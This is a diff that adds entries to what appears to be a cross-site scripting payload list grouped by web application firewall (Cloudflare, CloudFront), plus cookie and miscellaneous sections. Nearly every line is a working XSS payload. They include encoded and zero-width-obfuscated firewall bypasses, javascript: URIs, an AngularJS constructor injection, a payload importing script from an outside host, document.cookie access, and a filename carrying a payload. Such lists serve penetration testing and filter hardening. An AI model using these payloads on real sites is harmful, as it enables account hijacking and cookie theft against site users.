@@ -13,6 +13,8 @@
 <Img Src=//X55.is OnLoad%0C=import(Src)>  
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 <button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
+"><Svg Only=1 OnLoad​=confirm(atob("Q2xvdWRmbGFyZSBYU1Mg"))>
+["');alert('XSS');//"]
   
 3. Cloudfront Waf
 ">'><details/open/ontoggle=confirm('XSS')>  
@@ -20,7 +22,10 @@
 ';window/*aabb*/['al'%2b'ert'] document./*aabb*/location);//  
 ">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
 
-4. Otros
+4. Cookie
+logged_out_uuid=<​script>alert('Cookie based Xss by Muhammad Qasim')<​/script>
+
+5. Otros
 "><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
 1%22onfocus=%27alert%28document.cookie%29%27%20autofocus=
 1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
@@ -158,6 +163,11 @@ javascript:%ef%bb%bfalert(XSS)
 /path?next=javascript:top[/al/.source+/ert/.source](document.cookie)
 login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
 <details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(VulneravelXSS%26%2300000000000000000041//
+'"><svg><animate onbegin​=alert('hacked') attributeName=x></svg> 
+<a href=javascript​:alert('hacked')>Click Here</a>
+<IFRAME SRC="javascript​:alert('hacked');"></IFRAME>
+<div ng-app> <strong class="ng-init:constructor.constructor('alert('hacked')')()">aaa</strong> </div>
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`hacked` //
 
 # Create file whith payload XSS.
 touch '"><img src=x onerror=alert("xss!")>.pdf'
